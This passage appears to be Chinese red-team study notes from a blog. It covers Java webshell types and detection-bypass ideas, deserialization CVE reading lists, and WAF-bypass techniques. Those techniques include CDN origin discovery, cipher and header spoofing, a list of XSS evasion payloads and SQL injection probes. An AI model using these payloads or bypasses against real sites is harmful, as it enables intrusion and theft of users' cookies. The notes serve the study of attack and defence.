&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt; &lt;/jsp-property-group&gt; &lt;/jsp-config&gt;</code></pre><p><strong>在目前常见的 webshel的后门种类,主要分如下几类：</strong></p><p>各种客户端的一句话 webshll （比如菜刀、冰蝎、蚁剑、c刀等常见客户端）、专门负责数据传输的webshell（与数据库进行交互）、Tune后门（基于 socks5协议的 reGeorg之类的）、小马（单纯的进行命令执行、单纯的进行文件管理/上传等功能)、大马（集成了文件管理、命令执行、数据库连接等多功能性大马）</p><p><strong>java执行命令方式</strong></p><p>在这节我们拿最基础的命令执行的来讨论，如何用多种方式写我们的负责命令执行的webshell</p><p>在java中，常见的能够执行命令的方式</p><p>java基础的webshell命令执行方式</p><p><strong>使用 java runtime exec()</strong></p><p>第一种常见的使，用 java.lang.Runtime 类进行执行系统命令，该方法也是目前市面上各种静态查杀 webshell 辅助工具首要盯着的目标，需要注意的是win 下和linux 需要区别对待，以及当使用多个命令组合使用注意坑。下面我们来看看代码。使用 Runtime类，调用exec执行命令返回一个Process对象,然后启一个 BufferedReader类，对返回的结果进行保存回显处理。执行exec的时候需要特别注意，带有|，&lt;，&gt; 等符号的命令需要使用如下代码的方式进行执行，要不然容易出错</p><p>讲解了webshell大部分能利用的机制：<br>Java 执行系统命令的方法和原理<br>用 ProcessBuilder 绕过检测<br>使用 Java 反射机制绕过检测<br>使用 Java 类加载机制绕过检测<br>获得 Class 对象的四种方法</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1180753</span>   --利用Java反射和类加载机制绕过JSP后门检测</code></pre><p>非常详细…</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>javasec.org<span class="hljs-regexp">/javase/</span>   --安全门</code></pre><p><strong>熟悉下Java反射基础：</strong><br>定义：<br>java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对<br>于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象的功能称为java语言的反射机制</p><p><strong>java反射涉及的类:</strong></p><pre><code class="hljs delphi">cass类：代表类的实体,在运行的Java应用程序中表示类和接口Field类：代表类的成员变量(类的属性)Method类：代表类的方法<span class="hljs-function"><span class="hljs-keyword">Constructor</span>类：代表类的构造方法</span></code></pre><p><strong>Class类中常见使用的</strong><br>1）获取的类中的方法<br>for Name(String className)：根据类名返回类的对象<br>getName()：获得类的完整路径名字</p><p>2）获取类中属性相关</p><p>getFields()：获得所有公有的属性对象<br>getDeclaredFields()：获得所有属性对象(带Declared的可以获取到私有private)</p><p>3）获得类中方法<br>getMethods()：获得该类所有公有的方法<br>getDeclaredMethod( String name, Class…&lt;?&gt; parameterTypes)：获得该类某个方法<br>getDeclaredMethods()：获得该类所有方法</p><p><strong>Fed类常见使用的</strong><br>equals(Object obj)：属性与ob相等则返回true<br>get(Object obj)：获得obj中对应的属性值<br>set(Object obj, Object value)：设置obj中对应属性值</p><p><strong>Method类</strong></p><p>invoke(object obj, Object…args) 传递 object对象及参数调用该对象对应的方法</p><p><strong>Constructor类</strong></p><p>newInstance(Object…initargs)：根据传递的参数创建类的对象</p><hr><h4 id="深究XMLdecoder"><a href="#深究XMLdecoder" class="headerlink" title="深究XMLdecoder"></a>深究XMLdecoder</h4><p>Oracle关于这个 xmldecoder造成的漏洞的CVE编号分别是CVE2017-3506、CVE2017-10271、CVE2019-2725</p><p>最早关于CVE2017-3506的补丁只是根据 object标签进行了限制</p><p>而根据文章中讲解的继承关系 object替换成void即可，它们实际上是不受影响的，因此便出现了CVE-2017-10271，而针对CVE-2017-10271的补丁限定了所有具有执行的节点</p><p>但这次CVE-2019-2725主要是class标签，class标签可代替 object标签来生成对象，因此这次漏洞本质还是 xmldecoder的问题，而补丁也是针对class标签来处理的</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/fnmsd/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">89889144</span>   --fnmsd作者-XMLDecoder解析流程分析https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">180725</span>   ---浅谈Weblogic反序列化——XMLDecoder的绕过史</code></pre><p>盲区，需要脑补！！！！</p><hr><h4 id="FastJson-反序列化学习"><a href="#FastJson-反序列化学习" class="headerlink" title="FastJson 反序列化学习"></a>FastJson 反序列化学习</h4><p>这篇文章总结的非常好：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">06</span><span class="hljs-regexp">/29/</span>FastJson-反序列化学习/</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">fastjson-remote-code-execute-poc：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shengqi158/</span>fastjson-remote-code-execute-pocFastjson <span class="hljs-number">1.2</span>.<span class="hljs-number">24</span>反序列化漏洞分析：https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">178012</span>.htmlFastjson反序列化漏洞研究：https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mrchang/</span>p/<span class="hljs-number">6789060</span>.htmlFastjson反序列化之TemplatesImpl调用链：https:<span class="hljs-regexp">//</span>p0rz9.github.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">05</span><span class="hljs-regexp">/12/</span>Fastjson反序列化之TemplatesImpl调用链/</code></pre><hr><h4 id="数据库安全思考之xml反序列化"><a href="#数据库安全思考之xml反序列化" class="headerlink" title="数据库安全思考之xml反序列化"></a>数据库安全思考之xml反序列化</h4><p>学习文章非常详细：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587690</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4452199</span></code></pre><p>参考：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>obtruse.syfrtext.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">07</span>/oracle-privilege-escalation-via.html</code></pre><hr><h4 id="Webshell绕安全模式执行命令"><a href="#Webshell绕安全模式执行命令" class="headerlink" title="Webshell绕安全模式执行命令"></a>Webshell绕安全模式执行命令</h4><p>绕过方法总结：</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.<span class="hljs-number">91</span>ri.org/<span class="hljs-number">8700</span>.html</code></pre><p>EXP和poc：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/yangyangwithgnu/</span>bypass_disablefunc_via_ld_preload</code></pre><hr><h4 id="Java-下的XEE漏洞"><a href="#Java-下的XEE漏洞" class="headerlink" title="Java 下的XEE漏洞"></a>Java 下的XEE漏洞</h4><p>该文章讲解了java xml下大部分的XEE漏洞原因和防御：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">10</span><span class="hljs-regexp">/31/</span>Java-XXE-总结/    --详细看看https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">3372</span>    --有多余时间可以看看</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">Java XXE注入修复问题填坑实录:https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>bTeJYzUN9T1u-KDZON5FiQ修不好的洞，JDK的坑——从WxJava XXE注入漏洞中发现了一个对JDK的误会:https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>bTeJYzUN9T1u-KDZON5FiQXML_External_Entity_Prevention_Cheat_Sheet：https:<span class="hljs-regexp">//</span>cheatsheetseries.owasp.org<span class="hljs-regexp">/cheatsheets/</span>XML_External_Entity_Prevention_Cheat_Sheet.html<span class="hljs-comment">#Java</span>一个被广泛流传的XXE漏洞错误修复方案：https:<span class="hljs-regexp">//g</span>v7.me<span class="hljs-regexp">/articles/</span><span class="hljs-number">2019</span><span class="hljs-regexp">/a-widely-circulated-xxe-bug-fix/</span>JAVA常见的XXE漏洞写法和防御：https:<span class="hljs-regexp">//</span>blog.spoock.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">10</span><span class="hljs-regexp">/23/</span>java-xxe/</code></pre><hr><h4 id="Solr-Velocity模板远程代码复现及利用指南"><a href="#Solr-Velocity模板远程代码复现及利用指南" class="headerlink" title="Solr Velocity模板远程代码复现及利用指南"></a>Solr Velocity模板远程代码复现及利用指南</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.secpulse.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">117281</span>.html   --详细复现防御https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/bmjoker/</span>p/<span class="hljs-number">11778478</span>.htmlhttps:<span class="hljs-regexp">//g</span>ovuln.com<span class="hljs-regexp">/topic/</span><span class="hljs-number">501</span>/   --P牛解释</code></pre><hr><h4 id="Solr-RCE-via-Velocity-template"><a href="#Solr-RCE-via-Velocity-template" class="headerlink" title="Solr-RCE-via-Velocity-template"></a>Solr-RCE-via-Velocity-template</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">11</span><span class="hljs-regexp">/03/</span>Solr-RCE-via-Velocity-template/</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">用Intellij idea搭建solr调试环境：https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">4</span>ceeb2c20002http:<span class="hljs-regexp">//</span>lucene.apache.org<span class="hljs-regexp">/solr/gui</span>de<span class="hljs-regexp">/6_6/</span>velocity-response-writer.html</code></pre><hr><h4 id="java-webshell-从入门到入狱系列2-攻防对抗之Bypass-上篇"><a href="#java-webshell-从入门到入狱系列2-攻防对抗之Bypass-上篇" class="headerlink" title="java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇"></a>java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇</h4><p>1）java反射bypass</p><p>2）反射的进阶版，通过结合利用byte字节码+反射的方式完全无任何痕迹的反射回显命令执行马</p><p>3）java 后门-unicode编码</p><hr><h4 id="java-webshell-从入门到入狱系列3-攻防对抗之Bypass-中篇"><a href="#java-webshell-从入门到入狱系列3-攻防对抗之Bypass-中篇" class="headerlink" title="java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇"></a>java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇</h4><p>其他姿势载入webshell的技巧tip</p><p>JavaWeb 随机后门（远程下载文件）</p><p>Java URLClassLoader 动态加载jar包 webshell</p><p>openrasp （开源应用运行时自我保护）Bypass</p><hr><h4 id="java-webshell-从入门到入狱系列4-攻防对抗之Bypass-下篇"><a href="#java-webshell-从入门到入狱系列4-攻防对抗之Bypass-下篇" class="headerlink" title="java webshell 从入门到入狱系列4-攻防对抗之Bypass-下篇"></a>java webshell 从入门到入狱系列4-攻防对抗之Bypass-下篇</h4><p>各家厂商早期针对流量层查杀 webshel的原理：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6550</span></code></pre><hr><h4 id="Java反序列化过程深究"><a href="#Java反序列化过程深究" class="headerlink" title="Java反序列化过程深究"></a>Java反序列化过程深究</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.sohu.com<span class="hljs-regexp">/a/</span><span class="hljs-number">357066711</span>_257305</code></pre><p>CVE-2017-3248<br>CVE-2017-3248</p><p><strong>防护建议</strong></p><pre><code class="hljs plain">可以在resolveclass和resovleproxyclass增加一些反序列化利用类的黑名单检查</code></pre><hr><h4 id="Apache-Slor不安全配置远程代码执行漏洞复现及jmx-rmi利用分析"><a href="#Apache-Slor不安全配置远程代码执行漏洞复现及jmx-rmi利用分析" class="headerlink" title="Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析"></a>Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析</h4><p>CVE-2019-12409</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://wemp.app/posts/<span class="hljs-number">008</span>ae<span class="hljs-number">6</span>ed-<span class="hljs-number">9</span>eee-<span class="hljs-number">4</span>fc<span class="hljs-number">4</span>-<span class="hljs-number">911</span>c-<span class="hljs-number">7</span>c<span class="hljs-number">603</span>c<span class="hljs-number">8</span>b<span class="hljs-number">884</span>a?utm_source=bottom-latest-posts</code></pre><p>该文章详细讲解复现！！！</p><hr><h4 id="java命令执行小细节"><a href="#java命令执行小细节" class="headerlink" title="java命令执行小细节"></a>java命令执行小细节</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.baizhiedu.com<span class="hljs-regexp">/article/</span><span class="hljs-number">1029</span></code></pre><p>学习查看知识点，广告可以忽视！！！</p><hr><h4 id="JDK反序列化Gadgets-7u21"><a href="#JDK反序列化Gadgets-7u21" class="headerlink" title="JDK反序列化Gadgets-7u21"></a>JDK反序列化Gadgets-7u21</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6884</span></code></pre><p>详细，真详细的文章！！</p><p>参考</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">175754</span>.htmlhttps:<span class="hljs-regexp">//</span>b1ue.cn<span class="hljs-regexp">/archives/</span><span class="hljs-number">176</span>.htmlhttps:<span class="hljs-regexp">//gi</span>st.github.com<span class="hljs-regexp">/frohoff/</span><span class="hljs-number">24</span>af7913611f8406eaf3https:<span class="hljs-regexp">//</span>sec.xiaomi.com<span class="hljs-regexp">/article/</span><span class="hljs-number">41</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/rickiyang/</span>p/<span class="hljs-number">11336268</span>.html   ---javassist使用全解析</code></pre><hr><h4 id="Weblogic-T3-CVE-2019-2890-Analysis"><a href="#Weblogic-T3-CVE-2019-2890-Analysis" class="headerlink" title="Weblogic-T3-CVE-2019-2890-Analysis"></a>Weblogic-T3-CVE-2019-2890-Analysis</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6904</span></code></pre><p>详细复现！！</p><hr><h4 id="spring-boot-actuators未授权漏洞"><a href="#spring-boot-actuators未授权漏洞" class="headerlink" title="spring-boot-actuators未授权漏洞"></a>spring-boot-actuators未授权漏洞</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">3162</span>ce30a853https:<span class="hljs-regexp">//</span>www.veracode.com<span class="hljs-regexp">/blog/</span>research/exploiting-spring-boot-actuators</code></pre><hr><h4 id="SEMCMS2-6后台文件上传漏洞审计"><a href="#SEMCMS2-6后台文件上传漏洞审计" class="headerlink" title="SEMCMS2.6后台文件上传漏洞审计"></a>SEMCMS2.6后台文件上传漏洞审计</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cesafe.com<span class="hljs-regexp">/html/</span><span class="hljs-number">6190</span>.htmlhttps:<span class="hljs-regexp">//</span>www.yir6.cn<span class="hljs-regexp">/Web/</span><span class="hljs-number">347</span>.html   --Admin/SEMCMS_Upfile.php代码分析</code></pre><hr><h4 id="代码审计之lvyecms后台getshell"><a href="#代码审计之lvyecms后台getshell" class="headerlink" title="代码审计之lvyecms后台getshell"></a>代码审计之lvyecms后台getshell</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.wenwenya.com<span class="hljs-regexp">/anquan/</span><span class="hljs-number">516051</span>.htmlhttps:<span class="hljs-regexp">//</span>webcache.googleusercontent.com<span class="hljs-regexp">/search?q=cache:9JJuN-bvrgwJ:https:/</span><span class="hljs-regexp">/www.secshi.com/</span><span class="hljs-number">22396</span>.html+&amp;cd=<span class="hljs-number">3</span>&amp;hl=zh-CN&amp;ct=clnk&amp;gl=hk</code></pre><hr><h4 id="Log4j-Unserialize-Analysis"><a href="#Log4j-Unserialize-Analysis" class="headerlink" title="Log4j-Unserialize-Analysis"></a>Log4j-Unserialize-Analysis</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7004</span>https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587690</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4452130</span></code></pre><p>两篇文章内容一致！详细介绍了CVE-2019-17571、CVE-2017-5645</p><hr><h4 id="JAVA反序列化-FastJson组件"><a href="#JAVA反序列化-FastJson组件" class="headerlink" title="JAVA反序列化- FastJson组件"></a>JAVA反序列化- FastJson组件</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7027</span></code></pre><p>非常难，内容非常多！！！加油！！！这块比较难</p><hr><h4 id="Spring-securiy-oauth2-CVE-2018-1260"><a href="#Spring-securiy-oauth2-CVE-2018-1260" class="headerlink" title="Spring-securiy-oauth2 (CVE-2018-1260)"></a>Spring-securiy-oauth2 (CVE-2018-1260)</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.spoock.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">05</span><span class="hljs-regexp">/13/</span>cve-<span class="hljs-number">2018</span>-<span class="hljs-number">1260</span>/</code></pre><p>文章内容复现类似，可分析查看…</p><hr><h3 id="WAF-bypass"><a href="#WAF-bypass" class="headerlink" title="WAF-bypass"></a>WAF-bypass</h3><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/06.png" alt="bypasswaf"></p><h4 id="找真实IP，绕过CDN"><a href="#找真实IP，绕过CDN" class="headerlink" title="找真实IP，绕过CDN"></a>找真实IP，绕过CDN</h4><p>云waf一般可以通过此方法绕过</p><p><strong>识别CDN</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">nslookup</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span></code></pre><p>或者使用站长工具查看IP是否唯一等</p><p><strong>寻找真实的IP</strong><br>DNS历史解析记录<br>寻找DNS历史记录，找到后修改hos文件即可：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>site.ip138.com/www.baidu.com https:<span class="hljs-regexp">//</span>dnsdb.io<span class="hljs-regexp">/zh-cn/</span> https:<span class="hljs-regexp">//</span>x.threatbook.cn/ http:<span class="hljs-regexp">//</span>toolbar.netcraft.com/site_report?url= https:<span class="hljs-regexp">//</span>censys.io/ipv4?q=www.baidu.com http:<span class="hljs-regexp">//</span>viewdns.info/https:<span class="hljs-regexp">//</span>community.riskiq.com/home https:<span class="hljs-regexp">//</span>securitytrails.com<span class="hljs-regexp">/list/</span>apex_domain/jgbz.baidu.com</code></pre><p><strong>RSS邮箱订阅，查看邮件源码</strong><br>一般也会得到真实的IP地址，通过rss订阅的方式，可以查找到订阅的消息中真实IP<br>或者在原始信息-头信息中（unknown[xx.xx.xx.xxIP])信息</p><p><strong>服务器向外请求（DNSLOG）</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Xy--1/</span>p/<span class="hljs-number">12896599</span>.html</code></pre><p><strong>同网段子域名信息</strong><br>DNS服务器域名信息：</p><pre><code class="hljs nginx"><span class="hljs-attribute">google</span> Public DNS（<span class="hljs-number">8.8.8.8</span>，<span class="hljs-number">8.8.4.4</span>）OpenDNS（<span class="hljs-number">208.67.222.222</span>，<span class="hljs-number">208.67.220.220</span>）OpenDNS Family（<span class="hljs-number">208.67.222.123</span>，<span class="hljs-number">208.67.220.123</span>）Dyn DNS（<span class="hljs-number">216.146.35.35</span>，<span class="hljs-number">216.146.36.36</span>）Comodo Secure（<span class="hljs-number">8.26.56.26</span>，<span class="hljs-number">8.20.247.20</span>）UltraDNS（<span class="hljs-number">156.154.70.1</span>，<span class="hljs-number">156.154.71.1</span>）Norton ConnectSafe（<span class="hljs-number">199.85.126.10</span>，<span class="hljs-number">199.85.127.10</span>）</code></pre><h4 id="https降级绕过"><a href="#https降级绕过" class="headerlink" title="https降级绕过"></a>https降级绕过</h4><p>可能https有waf，http没有</p><hr><h4 id="ssl问题绕过"><a href="#ssl问题绕过" class="headerlink" title="ssl问题绕过"></a>ssl问题绕过</h4><p>所以选用一个WAF不支持但是服务器支持的算法，选用<code>TLSv1 256 bits ECDHE-RSA-AES256-SHA</code>。就可以是WAF无法识别导致绕过</p><pre><code class="hljs awk">curl --ciphers ECDHE-RSA-AES256-SHA https:<span class="hljs-regexp">//</span>waf-test.lab.local/ssl-cipher-test</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/07.png" alt="bypasswaf"><br>WAF支持的算法如下：<br><strong>SSLv3</strong></p><pre><code class="hljs autohotkey">SSL_RS<span class="hljs-built_in">A_WITH</span>_NULL_MD5SSL_RS<span class="hljs-built_in">A_WITH</span>_NULL_SHASSL_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_MD5SSL_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_SHASSL_RS<span class="hljs-built_in">A_WITH</span>_DES_CBC_SHASSL_RS<span class="hljs-built_in">A_WITH</span>_3DES_EDE_CBC_SHASSL_RS<span class="hljs-built_in">A_EXPORT</span>_WITH_RC4_40_MD5SSL_RS<span class="hljs-built_in">A_EXPORT</span>_WITH_DES40_CBC_SHA</code></pre><p><strong>TLS/1.0-1.2</strong></p><pre><code class="hljs autohotkey">TLS_RS<span class="hljs-built_in">A_WITH</span>_NULL_SHA256TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_128_CBC_SHATLS_RS<span class="hljs-built_in">A_WITH</span>_AES_256_CBC_SHATLS_RS<span class="hljs-built_in">A_EXPORT1024</span>_WITH_RC4_56_MD5TLS_RS<span class="hljs-built_in">A_EXPORT1024</span>_WITH_RC4_56_SHATLS_RS<span class="hljs-built_in">A_WITH</span>_AES_128_CBC_SHA256TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_256_CBC_SHA256TLS_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_MD5 = &#123; <span class="hljs-number">0</span>x000x04 &#125;TLS_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_SHA = &#123; <span class="hljs-number">0</span>x000x05 &#125;TLS_RS<span class="hljs-built_in">A_WITH</span>_DES_CBC_SHA = &#123; <span class="hljs-number">0</span>x000x09 &#125;</code></pre><p>参考文章：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xdxd.love<span class="hljs-regexp">/2018/</span><span class="hljs-number">09</span><span class="hljs-regexp">/10/</span>利用SSL问题绕过WAF文章分析/</code></pre><hr><h4 id="method-绕过"><a href="#method-绕过" class="headerlink" title="method 绕过"></a>method 绕过</h4><p>1）改变method，get改post，post 改上传（还有cookies传值）<br>2）改变method为不规则，比如改get，post为HELLLOXX等（某些apache版本）</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>/xxx/?id=<span class="hljs-number">1</span>+and+sleep(<span class="hljs-number">3</span>) HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">DigApis</span> /xxx/?id=<span class="hljs-number">1</span>+and+sleep(<span class="hljs-number">3</span>)HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></code></pre><h4 id="Heard-IP-绕过-一般应用拦截，非WAF"><a href="#Heard-IP-绕过-一般应用拦截，非WAF" class="headerlink" title="Heard IP 绕过(一般应用拦截，非WAF)"></a>Heard IP 绕过(一般应用拦截，非WAF)</h4><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-forwarded-for：<span class="hljs-number">127.0.0.1</span> <span class="hljs-attribute">X</span>-remote-IP：<span class="hljs-number">127.0.0.1</span> <span class="hljs-attribute">X</span>-originating-IP：<span class="hljs-number">127.0.0.1</span> <span class="hljs-attribute">x</span>-remote-addr：<span class="hljs-number">127.0.0.1</span><span class="hljs-attribute">x</span>-client-ip：<span class="hljs-number">127.0.0.1</span></code></pre><p><strong>Heard content-type 绕过</strong></p><pre><code class="hljs fortran">content-<span class="hljs-keyword">type</span>为空 content-<span class="hljs-keyword">type</span>改成其他的 content-<span class="hljs-keyword">type</span>必须指定唯一一个类型，例如 application/ octet-stream（比如安全狗）content-<span class="hljs-keyword">type</span>改成不规则的text/htm1xxxxxxContent-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span> ; boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：mUltiPart/<span class="hljs-keyword">ForM</span>-<span class="hljs-keyword">dATa</span>；boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-datax；boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>，boundary=<span class="hljs-number">0000</span> Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span> boundary=<span class="hljs-number">0000</span> content-<span class="hljs-keyword">Type</span>：multipart/whatever；boundary=<span class="hljs-number">0000</span>content-<span class="hljs-keyword">Type</span>：multipart/； boundary=<span class="hljs-number">0000</span>content-<span class="hljs-keyword">Type</span>: application/octet-stream；</code></pre><hr><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>基础常用的常规语句</p><pre><code class="hljs perl">?id=alert(document[<span class="hljs-string">&#x27;cookie&#x27;</span>]) ?id=<span class="hljs-string">&quot;;location=location.hash)//#0=&#123;&#125;;alert(0) </span><span class="hljs-string">?id=%&quot;;eval(unescape(location))//#%0Aalert(0) </span><span class="hljs-string">?id=&lt;script&lt;&#123;alert(1)&#125;/&gt;&lt;/script&gt; </span><span class="hljs-string">?id=&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</span><span class="hljs-string">?id=%3cscript%3ealert(1)%3c%2fscript%3c </span><span class="hljs-string">?id=&lt;a href=&quot;</span>javas&amp;<span class="hljs-comment">#99;ript&amp;#35;alert(1);&quot;&gt;</span>id=%253c%2573%2563%2572%2569%257<span class="hljs-number">0</span>%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%257<span class="hljs-number">0</span>%2574%253e?id=&lt;object+data=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;&lt;<span class="hljs-regexp">/object&gt;</span><span class="hljs-regexp">?id=1234&amp;&quot;&gt;&lt;script&gt;alert(1)&lt;/script</span>&gt;=<span class="hljs-number">1234</span>     <span class="hljs-comment">#参数名</span></code></pre><p>直接在文件名例如asp、php后加即可绕过<br>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/lcamry/</span>articles/<span class="hljs-number">5622244</span>.html</code></pre><hr><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><p>简单判别诸如点以及数据库类型 ：</p><pre><code class="hljs gherkin">数据库类型丨连接符丨注释符号丨其他特殊方式丨唯一的默认表变量和函数 MSSQL|<span class="hljs-string"> %2B (URL加号编码) </span>|<span class="hljs-string"> -- </span>|<span class="hljs-string"> 待补充丨@@PACK_RECEIVED </span><span class="hljs-string">MYSQL</span>|<span class="hljs-string"> %20 (URL空格编码)丨# / -- </span>|<span class="hljs-string"> 待补充 </span>|<span class="hljs-string">  CONNECTION_ID() </span><span class="hljs-string">Oracle I %7C (URL竖线编码) </span>|<span class="hljs-string"> -- 待补充 </span>|<span class="hljs-string"> BITAND(1,1) </span><span class="hljs-string">PGsql </span>|<span class="hljs-string"> %7C (URL竖线编码) </span>|<span class="hljs-string"> -- </span>|<span class="hljs-string">ad1::int=1 </span>|<span class="hljs-string"> getpgusername() </span><span class="hljs-string">Access </span>|<span class="hljs-string"> %26 (URL与号编码) </span>|<span class="hljs-string"> N/A </span>|<span class="hljs-string"> 待补充 </span>|<span class="hljs-string"> msysobjects</span></code></pre><p>为避免被wa拦截以及封禁P,注入建议不首先使用<code>and</code>以及<code>or</code>语句。</p><p>可用如下方式替换：</p><p><strong>数字型注入：</strong></p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=2*2?<span class="hljs-attribute">id</span>=4</code></pre><p><strong>字符型注入，根据上表判断</strong></p><pre><code class="hljs 